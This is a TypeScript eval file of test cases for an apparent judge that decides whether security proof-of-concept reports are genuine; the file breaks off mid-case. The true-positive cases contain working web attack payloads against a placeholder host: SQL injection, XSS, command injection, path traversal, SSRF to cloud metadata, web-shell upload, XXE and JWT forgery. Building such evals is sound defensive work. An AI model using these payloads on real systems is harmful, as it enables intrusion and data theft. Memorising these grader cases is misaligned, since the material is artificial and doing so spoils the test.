import type { FindingJudgeInput, FindingType } from "../index";

export type JudgeEvalCategory =
  | "true-positive"
  | "false-positive"
  | "expected-behavior"
  | "informational";

export interface JudgeEvalCase {
  name: string;
  input: FindingJudgeInput;
  expected: {
    valid: boolean;
    findingType: FindingType;
    minConfidence?: number;
    maxConfidence?: number;
    mustMentionConcerns?: string[];
  };
  category: JudgeEvalCategory;
}

export const judgeEvalCases: JudgeEvalCase[] = [
  {
    name: "sql injection exposes database rows",
    category: "true-positive",
    expected: {
      valid: true,
      findingType: "vulnerability",
      minConfidence: 0.75,
    },
    input: {
      pocType: "python",
      pocScript: `import requests

url = "https://target.example/api/search?q=' UNION SELECT email,password_hash FROM users--"
response = requests.get(url, timeout=10)
print(response.status_code)
print(response.text)`,
      pocOutput: {
        exitCode: 0,
        stderr: "",
        stdout: `200
SQL syntax warning near: q='' UNION SELECT email,password_hash FROM users--'
email,password_hash
alice@example.com,$2b$12$P0cOnlyHash
bob@example.com,$2b$12$AnotherP0cHash`,
      },
      claim: {
        title: "SQL injection in search endpoint exposes user rows",
        description:
          "The search query parameter is concatenated into a SQL statement and can be used to extract rows from the users table.",
        impact:
          "An unauthenticated attacker can read sensitive user records from the backing database.",
        evidence:
          "The POC sent a UNION SELECT payload and the response included email and password_hash columns for multiple users.",
        endpoint: "https://target.example/api/search",
        vulnerabilityClass: "sqli",
      },
    },
  },
  {
    name: "reflected xss in executable response context",
    category: "true-positive",
    expected: {
      valid: true,
      findingType: "vulnerability",
      minConfidence: 0.75,
    },
    input: {
      pocType: "bash",
      pocScript: `#!/bin/bash
payload='<img src=x onerror=alert(document.domain)>'
curl -s "https://target.example/search?q=$payload"`,
      pocOutput: {
        exitCode: 0,
        stderr: "",
        stdout: `<html><body>
<h1>Search results for <img src=x onerror=alert(document.domain)></h1>
<script>window.__page="search"</script>
</body></html>`,
      },
      claim: {
        title: "Reflected XSS in search results",
        description:
          "The q parameter is reflected into the HTML body without escaping, allowing script execution through event handlers.",
        impact:
          "An attacker can execute JavaScript in a victim's browser and steal session-bound data or perform actions as the user.",
        evidence:
          "The response body contains the exact img/onerror payload in HTML, not encoded text.",
        endpoint: "https://target.example/search",
        vulnerabilityClass: "xss",
      },
    },
  },
  {
    name: "command injection returns remote id output",
    category: "true-positive",
    expected: {
      valid: true,
      findingType: "vulnerability",
      minConfidence: 0.75,
    },
    input: {
      pocType: "bash",
      pocScript: `#!/bin/bash
curl -s "https://target.example/admin/ping?host=127.0.0.1;id"`,
      pocOutput: {
        exitCode: 0,
        stderr: "",
        stdout: `PING 127.0.0.1: 56 data bytes
uid=33(www-data) gid=33(www-data) groups=33(www-data)
command completed on target container web-01`,
      },
      claim: {
        title: "Command injection in admin ping utility",
        description:
          "The host parameter is passed to a shell command without sanitization, allowing appended shell commands to execute on the server.",
        impact:
          "An attacker with access to the admin utility can execute arbitrary OS commands as the web process user.",
        evidence:
          "The POC appended ;id and the HTTP response contained uid=33(www-data), showing command execution on the target.",
        endpoint: "https://target.example/admin/ping",
        vulnerabilityClass: "command-injection",
      },
    },
  },
  {
    name: "idor returns another user's invoice",
    category: "true-positive",
    expected: {
      valid: true,
      findingType: "vulnerability",
      minConfidence: 0.75,
    },
    input: {
      pocType: "python",
      pocScript: `import requests

headers = {"Authorization": "Bearer token-for-user-1001"}
response = requests.get("https://target.example/api/invoices/inv_2002", headers=headers, timeout=10)
print(response.status_code)
print(response.text)`,
      pocOutput: {
        exitCode: 0,
        stderr: "",
        stdout: `200
{"invoiceId":"inv_2002","accountId":"acct_2002","ownerEmail":"victim@example.com","amount":14900}`,
      },
      claim: {
        title: "IDOR allows access to another account's invoice",
        description:
          "A user authenticated as acct_1001 can request invoice IDs belonging to acct_2002 and receive the full invoice response.",
        impact:
          "Users can access billing data for other accounts by changing invoice identifiers.",
        evidence:
          "The POC used a token for acct_1001 but received invoice inv_2002 with ownerEmail victim@example.com.",
        endpoint: "https://target.example/api/invoices/inv_2002",
        vulnerabilityClass: "idor",
      },
    },
  },
  {
    name: "path traversal reads passwd outside base directory",
    category: "true-positive",
    expected: {
      valid: true,
      findingType: "vulnerability",
      minConfidence: 0.75,
    },
    input: {
      pocType: "bash",
      pocScript: `#!/bin/bash
curl -s "https://target.example/download?file=../../../../etc/passwd"`,
      pocOutput: {
        exitCode: 0,
        stderr: "",
        stdout: `root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin`,
      },
      claim: {
        title: "Path traversal in file download endpoint",
        description:
          "The file parameter accepts traversal sequences and returns files outside the intended download directory.",
        impact:
          "An attacker can read local server files available to the web process.",
        evidence:
          "Requesting ../../../../etc/passwd returned standard passwd file entries including root and www-data.",
        endpoint: "https://target.example/download",
        vulnerabilityClass: "path-traversal",
      },
    },
  },
  {
    name: "ssrf retrieves cloud metadata role",
    category: "true-positive",
    expected: {
      valid: true,
      findingType: "vulnerability",
      minConfidence: 0.75,
    },
    input: {
      pocType: "python",
      pocScript: `import requests

url = "https://target.example/api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
response = requests.get(url, timeout=10)
print(response.status_code)
print(response.text)`,
      pocOutput: {
        exitCode: 0,
        stderr: "",
        stdout: `200
app-prod-web-role
Code: Success
LastUpdated: 2026-05-11T12:00:00Z`,
      },
      claim: {
        title: "SSRF exposes cloud instance metadata",
        description:
          "The URL fetcher accepts arbitrary URLs and can access the link-local cloud metadata service from the server network.",
        impact:
          "An attacker can enumerate instance metadata and potentially retrieve temporary cloud credentials.",
        evidence:
          "Requesting the metadata IAM credentials path through the fetch endpoint returned the app-prod-web-role metadata response.",
        endpoint: "https://target.example/api/fetch",
        vulnerabilityClass: "ssrf",
      },
    },
  },
  {
    name: "missing authentication exposes admin export",
    category: "true-positive",
    expected: {
      valid: true,
      findingType: "vulnerability",
      minConfidence: 0.75,
    },
    input: {
      pocType: "bash",
      pocScript: `#!/bin/bash
curl -s -H "Authorization:" "https://target.example/admin/export/users"`,
      pocOutput: {
        exitCode: 0,
        stderr: "",
        stdout: `HTTP/2 200
{"users":[{"id":1,"email":"admin@example.com","role":"admin"},{"id":2,"email":"customer@example.com","role":"user"}]}`,
      },
      claim: {
        title: "Admin user export is accessible without authentication",
        description:
          "The admin export endpoint returns user records when no Authorization header is present.",
        impact:
          "Unauthenticated attackers can retrieve administrative user exports containing customer data.",
        evidence:
          "The POC explicitly sent an empty Authorization header and received a 200 response containing admin and customer records.",
        endpoint: "https://target.example/admin/export/users",
        vulnerabilityClass: "missing-authentication",
      },
    },
  },
  {
    name: "stored xss appears in profile page after save",
    category: "true-positive",
    expected: {
      valid: true,
      findingType: "vulnerability",
      minConfidence: 0.75,
    },
    input: {
      pocType: "python",
      pocScript: `import requests

session = requests.Session()
payload = '<svg onload=alert("stored-xss")>'
session.post("https://target.example/api/profile", json={"displayName": payload}, timeout=10)
response = session.get("https://target.example/users/me", timeout=10)
print(response.status_code)
print(response.text)`,
      pocOutput: {
        exitCode: 0,
        stderr: "",
        stdout: `200
<html><body><div class="display-name"><svg onload=alert("stored-xss")></div></body></html>`,
      },
      claim: {
        title: "Stored XSS in profile display name",
        description:
          "Profile display names are stored and later rendered into HTML without escaping.",
        impact:
          "An attacker can persist JavaScript that executes when other users view the affected profile.",
        evidence:
          "After saving an SVG onload payload, the profile page returned the same payload in an HTML element.",
        endpoint: "https://target.example/api/profile",
        vulnerabilityClass: "xss",
      },
    },
  },
  {
    name: "credentialed cors exposes private account data",
    category: "true-positive",
    expected: {
      valid: true,
      findingType: "vulnerability",
      minConfidence: 0.75,
    },
    input: {
      pocType: "bash",
      pocScript: `#!/bin/bash
curl -i -s "https://target.example/api/account" \\
  -H "Origin: https://evil.example" \\
  -H "Cookie: session=valid-user-session"`,
      pocOutput: {
        exitCode: 0,
        stderr: "",
        stdout: `HTTP/2 200
access-control-allow-origin: https://evil.example
access-control-allow-credentials: true
content-type: application/json

{"accountId":"acct_123","email":"victim@example.com","plan":"enterprise"}`,
      },
      claim: {
        title: "Credentialed CORS allows cross-origin account data theft",
        description:
          "The account API reflects arbitrary origins and permits credentials while returning private account data.",
        impact:
          "A malicious site can read authenticated account data from a victim browser.",
        evidence:
          "The response to Origin https://evil.example includes Access-Control-Allow-Credentials: true and private account JSON.",
        endpoint: "https://target.example/api/account",
        vulnerabilityClass: "cors",
      },
    },
  },
  {
    name: "unrestricted file upload executes web shell",
    category: "true-positive",
    expected: {
      valid: true,
      findingType: "vulnerability",
      minConfidence: 0.75,
    },
    input: {
      pocType: "bash",
      pocScript: `#!/bin/bash
curl -s -F "file=@shell.php;type=application/x-php" "https://target.example/uploads"
curl -s "https://target.example/uploads/shell.php?cmd=id"`,
      pocOutput: {
        exitCode: 0,
        stderr: "",
        stdout: `{"path":"/uploads/shell.php"}
uid=33(www-data) gid=33(www-data) groups=33(www-data)`,
      },
      claim: {
        title: "Unrestricted file upload leads to remote command execution",
        description:
          "The upload endpoint accepts PHP files into a web-served directory and executes them when requested.",
        impact:
          "An attacker can upload a server-side script and run OS commands as the web process.",
        evidence:
          "The POC uploaded shell.php, then requested it with cmd=id and received uid=33(www-data).",
        endpoint: "https://target.example/uploads",
        vulnerabilityClass: "file-upload",
      },
    },
  },
  {
    name: "xxe reads local hostname file",
    category: "true-positive",
    expected: {
      valid: true,
      findingType: "vulnerability",
      minConfidence: 0.75,
    },
    input: {
      pocType: "bash",
      pocScript: `#!/bin/bash
curl -s "https://target.example/api/xml-import" \\
  -H "Content-Type: application/xml" \\
  --data '<!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><import>&xxe;</import>'`,
      pocOutput: {
        exitCode: 0,
        stderr: "",
        stdout: `HTTP/2 200
{"imported":"ip-10-0-12-44.internal"}`,
      },
      claim: {
        title: "XXE in XML import reads local files",
        description:
          "The XML import parser resolves external entities and includes local file contents in the import response.",
        impact:
          "An attacker can read local files accessible to the application process.",
        evidence:
          "The POC used an external entity for file:///etc/hostname and the response included the internal hostname.",
        endpoint: "https://target.example/api/xml-import",
        vulnerabilityClass: "xxe",
      },
    },
  },
  {
    name: "jwt none algorithm bypass returns admin data",
    category: "true-positive",
    expected: {
      valid: true,
      findingType: "vulnerability",
      minConfidence: 0.75,
    },
    input: {
      pocType: "python",
      pocScript: `import requests

token = "eyJhbGciOiJub25lIn0.eyJzdWIiOiIxIiwiYWRtaW4iOnRydWV9."
response = requests.get("https://target.example/api/admin/settings", headers={"Authorization": f"Bearer {token}"}, timeout=10)
print(response.status_code)
print(response.text)`,
      pocOutput: {
        exitCode: 0,
        stderr: "",
        stdout: `200
{"featureFlags":{"billingAdmin":true},"secretsVisible":true}`,
      },
      claim: {
        title: "JWT none algorithm allows admin authorization bypass",
        description:
          "The API accepts an unsigned JWT using alg=none and trusts the admin claim.",
        impact:
          "Attackers can forge administrator tokens and access protected admin APIs.",
        evidence:
          "The POC sent an unsigned alg=none token with admin=true and received protected admin settings.",
        endpoint: "https://target.example/api/admin/settings",
        vulnerabilityClass: "authentication-bypass",
      },
    },
  },
  {
    name: "debug endpoint leaks environment secrets",
    category: "true-positive",
    expected: {
      valid: true,
      findingType: "vulnerability",
      minConfidence: 0.75,
    },
    input: {
      pocType: "bash",
      pocScript: `#!/bin/bash
curl -s "https://target.example/debug/env"`,
      pocOutput: {
        exitCode: 0,
        stderr: "",
        stdout: `NODE_ENV=production
DATABASE_URL=postgres://app:REDACTED-PASSWORD@db.internal:5432/app
JWT_SIGNING_KEY=eval-only-secret`,
      },
      claim: {
        title: "Debug endpoint exposes production environment secrets",
        description:
          "A debug endpoint returns environment variables including database and JWT configuration.",
        impact:
          "Attackers can use leaked secrets to access backend systems or forge application tokens.",
        evidence:
          "The POC requested /debug/env and received DATABASE_URL and JWT_SIGNING_KEY values.",
        endpoint: "https://target.example/debug/env",
        vulnerabilityClass: "information-disclosure",
      },
    },
  },
  {
    name: "open redirect sends users to external domain",
    category: "true-positive",
    expected: {
      valid: true,
      findingType: "vulnerability",
      minConfidence: 0.7,
    },
    input: {
      pocType: "bash",
      pocScript: `#!/bin/bash
curl -i -s "https://target.example/login?next=https://evil.example/phish"`,
      pocOutput: {
        exitCode: 0,
        stderr: "",
        stdout: `HTTP/2 302
location: https://evil.example/phish
set-cookie: csrf=eval`,
      },
      claim: {
        title: "Open redirect in login next parameter",
        description:
          "The login flow redirects to arbitrary external URLs supplied in the next parameter.",
        impact:
          "Attackers can craft trusted-domain links that redirect users to phishing pages.",
        evidence:
          "The POC supplied https://evil.example/phish and the response Location header matched that external URL.",
        endpoint: "https://target.example/login",
        vulnerabilityClass: "open-redirect",
      },
    },
  },
  {
    name: "csrf changes account email without token",
    category: "true-positive",
    expected: {
      valid: true,
      findingType: "vulnerability",
      minConfidence: 0.7,
    },
    input: {
      pocType: "bash",
      pocScript: `#!/bin/bash
curl -i -s "https://target.example/api/account/email" \\
  -H "Cookie: session=valid-user-session" \\
  -H "Origin: https://evil.example" \\
  -X POST --data "email=attacker@example.com"`,
      pocOutput: {
        exitCode: 0,
        stderr: "",
        stdout: `HTTP/2 200
content-type: application/json

{"updated":true,"email":"attacker@example.com","csrfChecked":false}`,
      },
      claim: {
        title: "CSRF allows account email changes",
        description:
          "The account email update endpoint accepts state-changing cross-site requests without a CSRF token.",
        impact:
          "A malicious site can change a victim's account email when the victim is authenticated.",
        evidence:
          "The POC sent a POST from an evil Origin with only the session cookie and the response confirmed email updated with csrfChecked=false.",
        endpoint: "https://target.example/api/account/email",
        vulnerabilityClass: "csrf",
      },
    },
  },
  {
    name: "fabricated echo evidence without network request",
    category: "false-positive",
    expected: {
      valid: false,
      findingType: "vulnerability",
      maxConfidence: 0.7,
      mustMentionConcerns: ["network request", "fabricated"],
    },
    input: {
      pocType: "bash",
      pocScript: `#!/bin/bash
echo "Exploit successful: admin password is hunter2"
exit 0`,
      pocOutput: {
        exitCode: 0,
        stderr: "",
        stdout: "Exploit successful: admin password is hunter2",
      },
      claim: {
        title: "Authentication bypass exposes admin password",
        description:
          "The login endpoint can allegedly be bypassed to reveal administrator credentials.",
        impact: "Full administrative compromise through leaked credentials.",
        evidence: "The script printed an admin password.",
        endpoint: "https://target.example/login",
        vulnerabilityClass: "authentication-bypass",
      },
    },
  },
  {
    name: "hardcoded token printed as proof",
    category: "false-positive",
    expected: {
      valid: false,
      findingType: "vulnerability",
      maxConfidence: 0.7,
      mustMentionConcerns: ["hardcoded"],
    },
    input: {
      pocType: "python",
      pocScript: `token = "sk_live_FAKE_STATIC_TOKEN_FOR_TEST"
print("Leaked token:", token)`,
      pocOutput: {
        exitCode: 0,
        stderr: "",
        stdout: "Leaked token: sk_live_FAKE_STATIC_TOKEN_FOR_TEST",
      },
      claim: {
        title: "Secret API token leaked by profile endpoint",
        description:
          "The profile endpoint allegedly returns a live secret API token.",
        impact: "Attackers can use the token to access backend APIs.",
        evidence: "The POC output includes sk_live_FAKE_STATIC_TOKEN_FOR_TEST.",
        endpoint: "https://target.example/api/profile",
        vulnerabilityClass: "hardcoded-credentials",
      },
    },
  },
  {
    name: "grep checks string injected by script itself",
    category: "false-positive",
    expected: {
      valid: false,
      findingType: "vulnerability",
      maxConfidence: 0.7,
      mustMentionConcerns: ["injected", "script"],
    },
    input: {
      pocType: "bash",
      pocScript: `#!/bin/bash
payload="APEX_XSS_MARKER"
response="<html>$payload</html>"
if echo "$response" | grep -q "$payload"; then
  echo "XSS confirmed: $payload reflected"
fi`,
      pocOutput: {
        exitCode: 0,
        stderr: "",
        stdout: "XSS confirmed: APEX_XSS_MARKER reflected",
      },
      claim: {
        title: "Reflected XSS in help page",
        description:
          "The help page allegedly reflects arbitrary payloads into executable HTML.",
        impact: "Victim browsers can execute attacker-controlled JavaScript.",
        evidence: "The script found the marker in a response variable.",
        endpoint: "https://target.example/help",
        vulnerabilityClass: "xss",
      },
    },
  },
  {
    name: "poc exits zero regardless of http response",
    category: "false-positive",
    expected: {
      valid: false,
      findingType: "vulnerability",
      maxConfidence: 0.7,
      mustMentionConcerns: ["always exits 0"],
    },
    input: {
      pocType: "bash",
      pocScript: `#!/bin/bash
curl -s -o /tmp/response.txt -w "%{http_code}" "https://target.example/api/admin"
echo "Admin bypass confirmed"
exit 0`,
      pocOutput: {
        exitCode: 0,
        stderr: "",
        stdout: "403Admin bypass confirmed",
      },
      claim: {
        title: "Admin authorization bypass",
        description:
          "The admin API allegedly returns protected data to unauthenticated users.",
        impact: "Unauthenticated users can administer the application.",
        evidence: "The POC claimed admin bypass confirmed.",
        endpoint: "https://target.example/api/admin",
        vulnerabilityClass: "missing-authorization",
      },
    },
  },
  {
    name: "severity mismatch from 500 error to rce claim",
    category: "false-positive",
    expected: {
      valid: false,
      findingType: "vulnerability",
      maxConfidence: 0.7,
      mustMentionConcerns: ["severity", "impact"],
    },
    input: {
      pocType: "bash",
      pocScript: `#!/bin/bash
curl -i -s "https://target.example/api/render?template=%7B%7Bbad"`,
      pocOutput: {
        exitCode: 0,
        stderr: "",
        stdout: `HTTP/2 500
content-type: application/json

{"error":"Template parse error at column 3"}`,
      },
      claim: {
        title: "Critical remote code execution in template renderer",
        description:
          "Malformed template syntax causes a server error in the render endpoint.",
        impact:
          "The finding claims full remote code execution and database compromise.",
        evidence: "The POC receives a 500 template parse error.",
        endpoint: "https://target.example/api/render",
        vulnerabilityClass: "rce",
      },
    },
  },
  {
    name: "endpoint mismatch between claim and poc",
    category: "false-positive",
    expected: {
      valid: false,
      findingType: "vulnerability",
      maxConfidence: 0.7,
      mustMentionConcerns: ["endpoint"],
    },
    input: {
      pocType: "bash",
      pocScript: `#!/bin/bash
curl -s "https://target.example/health"`,
      pocOutput: {
        exitCode: 0,
        stderr: "",
        stdout: `{"status":"ok","version":"1.2.3"}`,
      },
      claim: {
        title: "User API leaks personal data",
        description:
          "The /api/v1/users endpoint allegedly leaks user records without authentication.",
        impact: "Attackers can enumerate personal data for every user.",
        evidence: "The POC output shows a JSON response.",
        endpoint: "https://target.example/api/v1/users",
        vulnerabilityClass: "information-disclosure",
      },
    },
  },
  {
    name: "local command output mistaken for target rce",
    category: "false-positive",
    expected: {
      valid: false,
      findingType: "vulnerability",
      maxConfidence: 0.7,
    },
    input: {
      pocType: "bash",
      pocScript: `#!/bin/bash
id
curl -s "https://target.example/admin/ping?host=127.0.0.1" >/dev/null`,
      pocOutput: {
        exitCode: 0,
        stderr: "",
        stdout: "uid=501(localuser) gid=20(staff) groups=20(staff)",
      },
      claim: {
        title: "Remote command execution in ping endpoint",
        description:
          "The ping endpoint allegedly executes injected commands on the target server.",
        impact:
          "Attackers can execute arbitrary commands on the production web server.",
        evidence: "The POC output includes id output.",
        endpoint: "https://target.example/admin/ping",
        vulnerabilityClass: "command-injection",
      },
    },
  },
  {
    name: "xss payload reflected only as escaped text",
    category: "false-positive",
    expected: {
      valid: false,
      findingType: "vulnerability",
      maxConfidence: 0.7,
    },
    input: {
      pocType: "bash",
      pocScript: `#!/bin/bash
curl -s "https://target.example/search?q=%3Cscript%3Ealert(1)%3C/script%3E"`,
      pocOutput: {
        exitCode: 0,
        stderr: "",
        stdout:
          "<html><body>Search: &lt;script&gt;alert(1)&lt;/script&gt;</body></html>",
      },
      claim: {
        title: "Reflected XSS in search parameter",
        description:
          "The search page allegedly reflects script tags that execute in the browser.",
        impact: "Attackers can execute JavaScript in victim browsers.",
        evidence: "The response includes the submitted script payload.",
        endpoint: "https://target.example/search",
        vulnerabilityClass: "xss",
      },
    },
  },
  {
    name: "sql injection claim only shows blocked request",
    category: "false-positive",
    expected: {
      valid: false,
      findingType: "vulnerability",
      maxConfidence: 0.7,
    },
    input: {
      pocType: "bash",
      pocScript: `#!/bin/bash
curl -i -s "https://target.example/api/search?q=' OR 1=1--"`,
      pocOutput: {
        exitCode: 0,
        stderr: "",
        stdout: `HTTP/2 403
content-type: application/json

{"error":"Request blocked by WAF rule SQLI-001"}`,
      },
      claim: {
        title: "SQL injection dumps all user records",
        description:
          "The search endpoint allegedly allows tautology-based SQL injection.",
        impact: "Attackers can extract the full user database.",
        evidence:
          "The POC sent a SQL injection payload and received a WAF error.",
        endpoint: "https://target.example/api/search",
        vulnerabilityClass: "sqli",
      },
    },
  },
  {
    name: "idor claim only retrieves caller's own resource",
    category: "false-positive",
    expected: {
      valid: false,
      findingType: "vulnerability",
      maxConfidence: 0.7,
    },
    input: {
      pocType: "python",
      pocScript: `import requests

headers = {"Authorization": "Bearer token-for-user-1001"}
response = requests.get("https://target.example/api/invoices/inv_1001", headers=headers, timeout=10)
print(response.status_code)
print(response.text)`,
      pocOutput: {
        exitCode: 0,
        stderr: "",
        stdout:
          '200\n{"invoiceId":"inv_1001","accountId":"acct_1001","ownerEmail":"caller@example.com"}',
      },
      claim: {
        title: "IDOR allows access to another user's invoice",
        description:
          "The invoice API allegedly returns other users' invoices when changing IDs.",
        impact: "Users can read invoices for unrelated accounts.",
        evidence:
          "The POC retrieved inv_1001 using user 1001 credentials, which belongs to the same user.",
        endpoint: "https://target.example/api/invoices/inv_1001",
        vulnerabilityClass: "idor",
      },
    },
  },
  {
    name: "ssrf claim only fetches attacker controlled public url",
    category: "false-positive",
    expected: {
      valid: false,
      findingType: "vulnerability",
      maxConfidence: 0.7,
    },
    input: {
      pocType: "bash",
      pocScript: `#!/bin/bash
curl -s "https://target.example/api/fetch?url=https://attacker.example/ping"`,
      pocOutput: {
        exitCode: 0,
        stderr: "",
        stdout: "fetched https://attacker.example/ping status=200 body=ok",
      },
      claim: {
        title: "SSRF exposes internal metadata service",
        description:
          "The fetch endpoint allegedly reaches internal-only services.",
        impact:
          "Attackers can access cloud metadata and internal administrative endpoints.",
        evidence: "The endpoint fetched an attacker-controlled public URL.",
        endpoint: "https://target.example/api/fetch",
        vulnerabilityClass: "ssrf",
      },
    },
  },
  {
    name: "path traversal attempt is blocked",
    category: "false-positive",
    expected: {
      valid: false,
      findingType: "vulnerability",
      maxConfidence: 0.7,
    },
    input: {
      pocType: "bash",
      pocScript: `#!/bin/bash
curl -i -s "https://target.example/download?file=../../../../etc/passwd"`,
      pocOutput: {
        exitCode: 0,
        stderr: "",
        stdout: `HTTP/2 400
content-type: application/json

{"error":"Invalid path traversal sequence"}`,
      },
      claim: {
        title: "Path traversal reads /etc/passwd",
        description:
          "The download endpoint allegedly returns files outside the download directory.",
        impact: "Attackers can read local operating system files.",
        evidence:
          "The POC sent traversal sequences but received a validation error.",
        endpoint: "https://target.example/download",
        vulnerabilityClass: "path-traversal",
      },
    },
  },
  {
    name: "open redirect claim only redirects to relative path",
    category: "false-positive",
    expected: {
      valid: false,
      findingType: "vulnerability",
      maxConfidence: 0.7,
    },
    input: {
      pocType: "bash",
      pocScript: `#!/bin/bash
curl -i -s "https://target.example/login?next=/dashboard"`,
      pocOutput: {
        exitCode: 0,
        stderr: "",
        stdout: `HTTP/2 302
location: /dashboard`,
      },
      claim: {
        title: "Open redirect sends users to arbitrary phishing sites",
        description:
          "The login next parameter allegedly redirects to any external URL.",
        impact: "Attackers can use trusted-domain URLs for phishing redirects.",
        evidence: "The POC shows a redirect to /dashboard.",
        endpoint: "https://target.example/login",
        vulnerabilityClass: "open-redirect",
      },
    },
  },
  {
    name: "cors claim on public health endpoint overstates impact",
    category: "false-positive",
    expected: {
      valid: false,
      findingType: "vulnerability",
      maxConfidence: 0.7,
    },
    input: {
      pocType: "bash",
      pocScript: `#!/bin/bash
curl -I -s "https://target.example/health" -H "Origin: https://evil.example"`,
      pocOutput: {
        exitCode: 0,
        stderr: "",
        stdout: `HTTP/2 200
access-control-allow-origin: *
content-type: application/json`,
      },
      claim: {
        title: "Critical CORS account takeover",
        description:
          "The health endpoint has wildcard CORS and is claimed to expose authenticated account data.",
        impact:
          "The finding claims attackers can steal private account data from victim browsers.",
        evidence:
          "The POC only shows wildcard CORS on /health, which returns no sensitive data and no credentials header.",
        endpoint: "https://target.example/health",
        vulnerabilityClass: "cors",
      },
    },
  },
  {
    name: "jwt decode without server acceptance",
    category: "false-positive",
    expected: {
      valid: false,
      findingType: "vulnerability",
      maxConfidence: 0.7,
    },
    input: {
      pocType: "javascript",
      pocScript: `const token = "eyJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoidXNlciJ9.signature";
console.log(Buffer.from(token.split(".")[1], "base64url").toString());`,
      pocOutput: {
        exitCode: 0,
        stderr: "",
        stdout: '{"role":"user"}',
      },
      claim: {
        title: "JWT privilege escalation to administrator",
        description:
          "The application allegedly allows attackers to modify JWT claims and become administrators.",
        impact: "Attackers can forge admin sessions.",
        evidence:
          "The POC decodes a JWT payload locally but never sends a modified token to the target.",
        endpoint: "https://target.example/api/admin/settings",
        vulnerabilityClass: "authentication-bypass",
      },
    },
  },
  {
    name: "file upload does not demonstrate execution",
    category: "false-positive",
    expected: {
      valid: false,
      findingType: "vulnerability",
      maxConfidence: 0.7,
    },
    input: {
      pocType: "bash",
      pocScript: `#!/bin/bash
curl -s -F "file=@avatar.php;type=image/jpeg" "https://target.example/profile/avatar"`,
      pocOutput: {
        exitCode: 0,
        stderr: "",
        stdout:
          '{"storedAs":"avatar.php.jpg","contentType":"image/jpeg","executable":false}',
      },
      claim: {
        title: "File upload leads to remote code execution",
        description:
          "The avatar upload endpoint allegedly executes uploaded PHP files.",
        impact:
          "Attackers can upload web shells and run arbitrary commands on the server.",
        evidence:
          "The upload accepted a file but stored it as avatar.php.jpg with executable=false.",
        endpoint: "https://target.example/profile/avatar",
        vulnerabilityClass: "file-upload",
      },
    },
  },
  {
    name: "csrf claim uses same origin scripted request",
    category: "false-positive",
    expected: {
      valid: false,
      findingType: "vulnerability",
      maxConfidence: 0.7,
    },
    input: {
      pocType: "bash",
      pocScript: `#!/bin/bash
curl -s "https://target.example/api/account/email" \\
  -H "Cookie: session=valid-user-session" \\
  -H "X-CSRF-Token: valid-token" \\
  -X POST --data "email=user@example.com"`,
      pocOutput: {
        exitCode: 0,
        stderr: "",
        stdout: '{"updated":true,"email":"user@example.com"}',
      },
      claim: {
        title: "CSRF changes account email",
        description:
          "The account email endpoint allegedly lacks CSRF protection.",
        impact: "A malicious site can change a victim's email address.",
        evidence:
          "The POC sent an authenticated same-origin-style request with a valid CSRF token.",
        endpoint: "https://target.example/api/account/email",
        vulnerabilityClass: "csrf",
      },
    },
  },
  {
    name: "xxe payload rejected by parser",
    category: "false-positive",
    expected: {
      valid: false,
      findingType: "vulnerability",
      maxConfidence: 0.7,
    },
    input: {
      pocType: "bash",
      pocScript: `#!/bin/bash
curl -s "https://target.example/api/xml-import" \\
  -H "Content-Type: application/xml" \\
  --data '<!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><import>&xxe;</import>'`,
      pocOutput: {
        exitCode: 0,
        stderr: "",
        stdout:
          '{"error":"DOCTYPE declarations are disabled","imported":false}',
      },
      claim: {
        title: "XXE reads /etc/passwd",
        description:
          "The XML import endpoint allegedly resolves external entities.",
        impact: "Attackers can read arbitrary local files.",
        evidence:
          "The POC sent an XXE payload but the parser rejected DOCTYPE declarations.",
        endpoint: "https://target.example/api/xml-import",
        vulnerabilityClass: "xxe",
      },
    },
  },
  {
    name: "stripe publishable key in client bundle",
    category: "expected-behavior",
    expected: {
      valid: true,
      findingType: "expected-behavior",
      minConfidence: 0.7,
    },
    input: {
      pocType: "bash",
      pocScript: `#!/bin/bash
curl -s "https://target.example/assets/app.js" | grep -o "pk_live_[A-Za-z0-9_]*"`,
      pocOutput: {
        exitCode: 0,
        stderr: "",
        stdout: "pk_live_51NPublicPublishableKey",
      },
      claim: {
        title: "Stripe publishable key exposed in JavaScript bundle",
        description:
          "The client bundle contains a Stripe pk_live publishable key.",
        impact:
          "The key can initialize Stripe.js but cannot perform secret API operations.",
        evidence:
          "The JavaScript bundle includes pk_live_51NPublicPublishableKey.",
        endpoint: "https://target.example/assets/app.js",
        vulnerabilityClass: "information-disclosure",
      },
    },
  },
  {
    name: "public firebase and recaptcha keys in bundle",
    category: "expected-behavior",
    expected: {
      valid: true,
      findingType: "expected-behavior",
      minConfidence: 0.7,
    },
    input: {
      pocType: "bash",
      pocScript: `#!/bin/bash
curl -s "https://target.example/static/config.js"`,
      pocOutput: {
        exitCode: 0,
        stderr: "",
        stdout: `window.config = {
  firebaseApiKey: "AIzaSyA-PublicClientSideKey",
  recaptchaSiteKey: "6LcPublicSiteKey"
};`,
      },
      claim: {
        title: "Google API keys exposed in public bundle",
        description:
          "The application exposes Firebase and reCAPTCHA site keys in a public JavaScript bundle.",
        impact:
          "These keys identify the client application and are intended for browser use.",
        evidence:
          "The bundle contains firebaseApiKey and recaptchaSiteKey values.",
        endpoint: "https://target.example/static/config.js",
        vulnerabilityClass: "information-disclosure",
      },
    },
  },
  {
    name: "checkout iframe accepts cross origin postmessages",
    category: "expected-behavior",
    expected: {
      valid: true,
      findingType: "expected-behavior",
      minConfidence: 0.7,
    },
    input: {
      pocType: "javascript",
      pocScript: `const target = "https://pay.target.example/checkout-frame";
console.log("Loaded iframe:", target);
console.log("postMessage listener accepts merchant origins for checkout events");`,
      pocOutput: {
        exitCode: 0,
        stderr: "",
        stdout:
          "Loaded iframe: https://pay.target.example/checkout-frame\npostMessage listener accepts merchant origins for checkout events",
      },
      claim: {
        title: "Checkout iframe accepts cross-origin postMessages",
        description:
          "The embedded checkout frame accepts postMessage events from merchant origins during payment initialization.",
        impact:
          "Cross-origin messaging is required for embedded checkout widgets and no unauthorized action was demonstrated.",
        evidence:
          "The widget accepts documented checkout initialization messages from embedding origins.",
        endpoint: "https://pay.target.example/checkout-frame",
        vulnerabilityClass: "postmessage",
      },
    },
  },
  {
    name: "demo environment intentionally relaxed controls",
    category: "expected-behavior",
    expected: {
